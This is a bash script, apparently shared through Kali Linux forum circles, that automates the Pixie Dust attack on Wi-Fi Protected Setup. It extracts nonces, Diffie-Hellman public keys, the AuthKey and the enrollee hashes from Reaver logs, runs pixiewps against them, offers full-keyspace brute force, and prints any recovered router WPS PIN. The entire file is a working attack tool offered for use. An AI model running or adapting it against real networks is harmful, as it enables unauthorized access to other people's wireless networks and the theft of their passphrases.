#!/bin/bash
##############################################
# ANSI code routines from Vulpi author of
#              PwnStar9.0 
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue           
q="\e[1;32m"	    # questions            green
inp="\e[1;36m"	    # input variables      magenta
yel="\e[1;33m"      # typed keyboard entries
##############################################

#Reaver 1.63 Text Changes for programers
#  -e, --pke         : DH peer  public key
##   -r, --pkr       : DH own public key
##   -s, --e-hash1     : Enrollee hash-1
##   -z, --e-hash2     : Enrollee hash-2
##   -a, --authkey     : Authentication session key
##   -n, --e-nonce    : Enrollee nonce

#pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>

cleanup()

{

rm -f /tmp/timer01.sh
rm -f /tmp/configlist.txt
rm -f /tmp/Aquarius01
rm -f /tmp/Aquarius02
rm -f /tmp/Aquarius03
rm -f /tmp/Aquarius04
rm -f /tmp/nonseq.txt
rm -f /tmp/pixieseq.txt
killall -q timer01.sh
killall -q xterm
killall -q pixiewps

return $?

}

control_c()
{

echo " Ending program"
sleep 5
cleanup
exit $?

}

trap control_c SIGINT


timer_fn()
{
#date1=`date +%s`
#while true; do echo -ne "  $(date -u --date @$((`date +%s` - $date1)) +%H:%M:%S)\r"; sleep 0.1; done

echo '#!/bin/bash' >/tmp/timer01.sh
echo 'date1=`date +%s`;' >>/tmp/timer01.sh
echo 'while true; do echo -ne "               $(date -u --date @$((`date +%s` - $date1)) +%H:%M:%S)\r"; sleep 0.1; done' >>/tmp/timer01.sh

chmod 755 /tmp/timer01.sh

xterm -g 44x2-1+0 -T "Pixiedust Elapsed Time" -e "/tmp/timer01.sh" &

}

# kill any processes and files

rm -f /tmp/timer01.sh
rm -f /tmp/configlist.txt
rm -f /tmp/Aquarius01
rm -f /tmp/Aquarius02
rm -f /tmp/Aquarius03
rm -f /tmp/Aquarius04
rm -f /tmp/nonseq.txt
rm -f /tmp/pixieseq.txt
killall -9 timer01.sh &> /dev/null
killall -9 Eterm &> /dev/null
killall -9 pixiewps /dev/null

# Select file to be used from the VARMAC Logs

######make directory for reaver output #############

PKRCOR="00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:02"

PKRERR="02:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"

PINNUM=0

if [[ ! -d "VARMAC_LOGS" ]]; then
    mkdir -p -m 700 VARMAC_LOGS;

	fi

echo -e "$info "
echo -e " PDDSA-K17-02.sh"
echo -e "$yel                                Musket Team Labs"
echo -e "$yel                      A Pixie Dust Data Sequence Analyzer"
echo -e "$warn                  For use with Reaver v1.63 and Pixiewps 1.3"
echo -e "$info            Dedicated to Clif High Inventor of Predictive Linguistics"
echo -e "$info              In Memory of Liam Scheff Author of Offical Stories"
echo -e "$info                       A Rare Earth Clarity In Thought"
echo -e ""
echo -e "$info            All Thanks to$yel soxrok2212$info,$yel wiire$info,$yel t6_x$info and$yel Datahead$info,"
echo -e "$info                 who's joint efforts made pixiedust possible."
echo -e ""
echo -e "$warn     This script requires$yel Reaver v1.63$warn and$yel pixiewps1.3$warn by$yel wiire$warn be installed."
echo -e "$info     See Pixie Dust Threads in kali-linux forums for latest downloads."
echo -e "$info     At program start a folder named$yel root/VARMAC_LOGS$info has been made."      
echo -e "$inp      Copy all your reaver output files in text format into this folder and"
echo -e "$inp   continue. This script is design to work with VMR-MDK and varmacscan see help files."
echo ""
echo -e "$info     ??Pausing  to allow user to complete file preparations ....??$txtrst"

echo -e ""

	while true

	do

echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"

SOURCENAMETEST=ZZZ

until [ $SOURCENAMETEST == y ] || [ $SOURCENAMETEST == Y ]; do  

echo -e "$txtrst "
ls /root/VARMAC_LOGS | tee /tmp/configlist.txt &> /dev/null
clear

# Make file list in folder a variable

configfiles=$(cat /tmp/configlist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e ""
echo -e "$info Reaver log files listed in the$yel VARMAC_LOGS$info folder.$txtrst"
echo " "
echo "$configfiles" | sed 's/^/       /'
echo ""
echo -e "$inp    Select the$yel reaver log file$inp to be used.$txtrst"
echo -e "$info  After selection the file will be seen in leafpad."
echo ""
echo -e "  You may inspect then delimit leafpad and continue...$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"

SOURCENAME=$(cat /tmp/configlist.txt | sed -n ""$grep_Line_Number"p")

echo ""

	while true
	do

leafpad /root/VARMAC_LOGS/$SOURCENAME &
echo ""
echo -e "$info You have chosen$yel $SOURCENAME$info as your reaver file."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"

read SOURCENAMETEST

	case $SOURCENAMETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"
	rm /tmp/configlist.txt

	done

		done
echo ""
echo "    Reading $SOURCENAME - if file is large this may take time,"
echo ""
echo "  please standby.......!"

###################
#Strip reaver output to only pixiedust data

## Get BSSID

BSSID=$(cat < VARMAC_LOGS/$SOURCENAME | awk -F' ' '{ if(($2 == "Waiting") && ($4 = "beacon")) {print $6}}')

#Correct Length

BSSID=$(echo $BSSID | awk '{print substr($0,0,18)}')

cat < VARMAC_LOGS/$SOURCENAME | awk -F' ' '{ if(($1 == "WPS:") && ($2 != "WPS")) {$1=""; print $0 }}' | sed -e 's/^[ \t]*//' > /tmp/Aquarius01

sleep 2

cat < /tmp/Aquarius01 | awk -F' ' '{ if(($1 == "DH") || ($1 == "Enrollee") || ($1 == "E-Hash1")|| ($1 == "E-Hash2")|| ($1 == "AuthKey") || ($1 == "Registrar")) {print $0 }}' > /tmp/Aquarius02

# remove data lines not rqr and remove duplicates thru awk pipe

cat < /tmp/Aquarius02 | awk -F' ' '{ if(($2 != "MAC") && ($2 != "Authentication") && ($2 != "Encryption") && ($2 != "Connection") && ($2 != "Config") && ($2 != "Wi-Fi") && ($2 != "RF") && ($2 != "Association") && ($2 != "Private") && ($2 != "public") && ($2 != "shared") && ($2 != "proved")&& ($2 != "Configuration")) {print $0 }}' |  awk '!seen[$0]++' > /tmp/Aquarius03


#Add Line Number for sequence pixie data stream remove white space from left of first word

cat -n  /tmp/Aquarius03 > /tmp/Aquarius04

###cat < /tmp/Aquarius03 | sed -e 's/^[ \t]*//' > /tmp/Aquarius03a
###cat -n  /tmp/Aquarius03a > /tmp/Aquarius04

#remove white space from left of first word

#cat < /tmp/Aquarius04 | sed -e 's/^[ \t]*//' > /tmp/Aquarius05

# Find first set with possible completion

cat < /tmp/Aquarius04 | awk -F' ' '{ if(($2 == "E-Hash2")) {print $1}}' > /tmp/nonseq.txt

# Search line number for further data

# E-Hash2 lines assign variables

#Line counter embed in awk

LNECNT=1

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

# To terminate program if no Ehash2 found

LINENULL=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

if [ ! -z $LINENULL ]; then

# Find total number of sequences in the file

until [ -z  $LINESTART ]; do   

	LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)
	LNECNT=$(($LNECNT + 1))

done

LNECNT=$(($LNECNT -2))

LNEND=$(($LNECNT))

LNEND=$(($LNEND))

#Reset back to line one

LNECNT=1

# EHash2 shows data completion back down to collect the five var 

BADAT=ZZZ

until [ $BADAT == 1 ]; do

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

SEQ_fn()

{

echo -e "$txtrst"

	if [ $LINESTART > 6  ]; then

SEQ7=$LINESTART

SEQ1=$(($SEQ7 -6 ))
SEQ2=$(($SEQ7 -5 ))
SEQ3=$(($SEQ7 -4 ))
SEQ4=$(($SEQ7 -3 ))
SEQ5=$(($SEQ7 -2 ))
SEQ6=$(($SEQ7 -1 ))
SEQ7=$(($SEQ7))

echo = $SEQ1
echo = $SEQ2
echo = $SEQ3
echo = $SEQ4
echo = $SEQ5
echo = $SEQ6
echo = $SEQ7


#{$1=$2=$3=""; print $0 }

ENONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ1 -F' ' '{ if(($1 == startlne) && ($2 == "Enrollee")) {$1=$2=$3=$4=$5=""; print $0}}')

RNONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ2 -F' ' '{ if(($1 == startlne) && ($2 == "Registrar")) {$1=$2=$3=$4=$5=""; print $0}}')

##PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "own")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "peer")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

##PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "peer")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "own")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

#PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "PKR:")) {print $3}}')

AUTHKEY=$(cat < /tmp/Aquarius04 |awk -v startlne=$SEQ5 -F' ' '{ if(($1 == startlne) && ($2 == "AuthKey")) {$1=$2=$3=$4=""; print $0}}')

HASH1=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ6 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash1")) {$1=$2=$3=$4=""; print $0}}')

HASH2=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ7 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash2")) {$1=$2=$3=$4=""; print $0}}')

#Remove blank spaces beginning of variable

ENONCE=$(echo $ENONCE | sed -e 's/^[ \t]*//')
RNONCE=$(echo $RNONCE | sed -e 's/^[ \t]*//')
PKR=$(echo $PKR | sed -e 's/^[ \t]*//')
PKE=$(echo $PKE | sed -e 's/^[ \t]*//')
AUTHKEY=$(echo $AUTHKEY | sed -e 's/^[ \t]*//')
HASH1=$(echo $HASH1 | sed -e 's/^[ \t]*//')
HASH2=$(echo $HASH2 | sed -e 's/^[ \t]*//')

#Replace space w/ colon

ENONCE=${ENONCE// /:}
RNONCE=${RNONCE// /:}
PKE=${PKE// /:}
PKR=${PKR// /:}
AUTHKEY=${AUTHKEY// /:}
HASH1=${HASH1// /:}
HASH2=${HASH2// /:}

bar=${bar// /:}


if [ "$PKR" == "$PKRERR" ]; then

		PKR=$PKRCOR

    		    fi



	if [ ! -z "$BSSID" ]; then

echo "E-BSSID: = $BSSID"

		fi

echo "E-Nonce: = $ENONCE ${#ENONCE}"
echo "R-Nonce: = $RNONCE ${#RNONCE}" 
echo "PKE: = $PKE ${#PKE}"
echo "PKR: = $PKR ${#PKR}"
echo "AuthKey: = $AUTHKEY ${#AUTHKEY}"
echo "E-Hash1: = $HASH1 ${#HASH1}"
echo "E-Hash2: = $HASH2 ${#HASH2}"

	fi

}

echo ""
echo -e "$info Checking Pixie Dust data sequence$yel $LNECNT$info."

SEQ_fn

if [ ${#ENONCE} = 47  ] && [ ${#PKE} = 575 ] && [ ${#RNONCE} = 47  ] && [ ${#PKR} = 575 ] && [ ${#AUTHKEY} = 95 ] && [ ${#HASH1} = 95 ] && [ ${#HASH2} = 95  ]; then

echo ""
echo -e "$info Checking Pixie Dust data sequence$yel $LNECNT$info."
sleep 1

	if [ ! -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -v 3 --mode 1,2,3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 xterm &> /dev/null
        rm -f /tmp/timer01.sh

			fi

	if [ -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -v 3 --mode 1,2,3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 Eterm &> /dev/null
        rm -f /tmp/timer01.sh

			fi


		BADAT=1
  		 
	else

		if [ $LNECNT -eq $LNEND ]; then

		BADAT=1
		echo -e "$info    Required Pixie data sequences exhausted.$txtrst"
		
			fi

		if [ $LNECNT -lt  $LNEND ]; then
					
		LNECNT=$(($LNECNT + 1))
		echo ""
		echo -e "$info    Required Pixie data incomplete trying the next sequence.$txtrst"
		sleep 1
		BADAT=0

				fi

					fi

		done

pixieseq="/tmp/pixieseq.txt"

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

#####BRUTE FORCE 
BRUTETEST=ZZZ

if [[ $PINFND != WPS ]]; then

until [ $BRUTETEST == y ] || [ $BRUTETEST == Y ]; do


echo ""
echo -e "$q    Do you wish to bruteforce the whole keyspace of data sequence$yel $LNECNT$info?"
echo ""
echo -e "$inp  This can take a long period of time sometimes more then 12 hours."

echo -e "$inp  Enter$yel (y/Y)$inp to brute force the pin or$yel (n/N)$inp to skip to next sequence.$txtrst"
read BRUTE


	while true
	do

echo ""
echo -e "$info You have chosen$yel $BRUTE$info."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again .$txtrst"

read BRUTETEST

	case $BRUTETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"


	done

		done

if [ $BRUTE = y ] || [ $BRUTE = Y ]; then

	if [ ! -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -f --mode 1,2,3,4,5 -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 xterm &> /dev/null
        rm -f /tmp/timer01.sh

			fi

	if [ -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -f -v 3 --mode 1,2,3,4,5 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 xterm &> /dev/null
        rm -f /tmp/timer01.sh


	fi

		fi
		
			fi


	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

###########Starting loop forward thru reaver output file############

LNEFRW=ZZZ
LNEFRWTEST=ZZZ
LNELFT=$(($LNEND - $LNECNT))
LNELFT=$(($LNELFT))

if [[ $LNELFT > 0 && $PINFND != WPS ]]; then

clear

echo ""
echo -e "$q    Do you wish to check further Pixie Dust E-Nonce, PKE, PKR, AuthKey,"

echo -e "  E-Hash1,E-Hash2 sequences embedded in the $yel $SOURCENAME$q file?"
echo ""
echo -e "$info  There are a total of$yel $LNELFT$info possible Pixie Dust sequences remaining."
echo ""
echo -e "$inp  Enter$yel (y/Y)$inp to check further sequences, enter $yel (n/N)$inp to abort.
$txtrst"
echo -e  "  Press any other key to try again:$txtrst"

	while true

	do

#echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
#echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	  esac

		done


until [ $LNELFT == 1 ] || [ $PINFND == WPS ]; do

	BADAT=1
	LNELFT=$(($LNEND - $LNECNT))
	LNECNT=$(($LNECNT + 1))
	LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

###Start of Loop

BADAT=ZZZ

	until [ $BADAT == 1 ]; do

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

echo ""
echo -e "$info Checking Pixie Dust data sequence$yel $LNECNT$info."

SEQ_fn

if [ ${#ENONCE} = 47  ] && [ ${#PKE} = 575 ] && [ ${#PKR} = 575 ] && [ ${#AUTHKEY} = 95 ] && [ ${#HASH1} = 95 ] && [ ${#HASH2} = 95  ]; then

echo ""
echo -e "$info    Checking Pixie Dust data sequence$yel $LNECNT$info."
echo -e "$info  Total Number of possible sequences  = $yel$LNEND$info."
echo ""

	sleep 1

	if [ ! -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 xterm &> /dev/null
        rm -f /tmp/timer01.sh

	##########Brute Force Option for Sequence

	# Set the pinfound var

	PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

	if [ -z $PINFND ]; then

BRUTEFORTEST=ZZZ

	until [ $BRUTEFORTEST == y ] || [ $BRUTEFORTEST == Y ]; do


	echo ""
	echo -e "$q    Do you wish to bruteforce the whole keyspace (mode 4) of data sequence$yel $LNECNT$info.?"
echo ""
echo -e "$inp  This can take a long period of time sometimes more then 12 hours."

echo -e "$inp  Enter$yel (y/Y)$inp to brute force the pin or$yel (n/N)$inp to skip to next sequence.$txtrst"
read BRUTEFOR

	while true
	do

echo ""
echo -e "$info You have chosen$yel $BRUTEFOR$info."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again .$txtrst"

	read BRUTEFORTEST

	case $BRUTEFORTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"


	done

		done


		if [ $BRUTEFOR == y ] || [ $BRUTEFOR == Y ]; then

			timer_fn
			sleep 1

			pixiewps -f -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

	fi

		fi

			fi

	if [ -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -f -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR  --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 xterm &> /dev/null
	rm -f /tmp/timer01.sh


	##########Brute Force Option for Sequence

	# Set the pinfound var

	PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')


		if [ -z $PINFND ]; then

BRUTEFORTEST=ZZZ

	until [ $BRUTEFORTEST == y ] || [ $BRUTEFORTEST == Y ]; do

	echo ""
	echo -e "$q    Do you wish to bruteforce the whole keyspace of data sequence$yel $LNECNT$info?"
echo ""
echo -e "$inp  This can take a long period of time sometimes more then 12 hours."

echo -e "$inp  Enter$yel (y/Y)$inp to brute force the pin or$yel (n/N)$inp to skip to next sequence.$txtrst"

read BRUTEFOR

	while true
	do

echo ""
echo -e "$info You have chosen$yel $BRUTEFOR$info."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again .$txtrst"

	read BRUTEFORTEST

	case $BRUTEFORTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"


	done

		done

			if [ $BRUTEFOR == y ] || [ $BRUTEFOR == Y ]; then

			timer_fn
			sleep 1

			pixiewps -f -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

		        killall -9 timer01.sh &> /dev/null
		        killall -9 xterm &> /dev/null
		        rm -f /tmp/timer01.sh

	fi

		fi

			fi


		BADAT=1  

	else

	BADAT=0
	LNECNT=$(($LNECNT + 1))
	echo ""
	echo -e "$info Required Pixie data incomplete trying the next sequence.$txtrst"
	sleep 1

		if [ -z $LINESTART ]; then

			BADAT=1
			echo ""
			echo "  Pixiedust data sequences exhausted."


		fi

			fi

				done

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ $PINFND != WPS ]; then

		clear

			fi
      
		done

			fi



				fi 


if [ -z  $LINENULL ]; then

echo ""
echo -e "$txtrst    WPS Pin Not Found."
echo -e "$txtrst  Pixie Dust Sequences Exhausted - ending program."
echo -e "$txtrst"

		fi

if [[ $LNELFT == 1 && $PINFND != WPS ]] || [[ $LNEND = 1 && $PINFND != WPS ]]; then

echo ""
echo -e "$txtrst    WPS Pin Not Found."
echo -e "$txtrst  Pixie Dust Sequences Exhausted - ending program."
echo -e "$txtrst"

		fi

if [[ $PINFND == WPS ]]; then

WPSPIN=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $4}}')

echo ""
echo -e "$txtrst    WPS Pin Found!"
echo ""
echo -e "$txtrst    WPS Pin = $WPSPIN"
echo ""
echo -e "$txtrst    Ending program...."
echo -e "$txtrst"

		fi



sleep 5

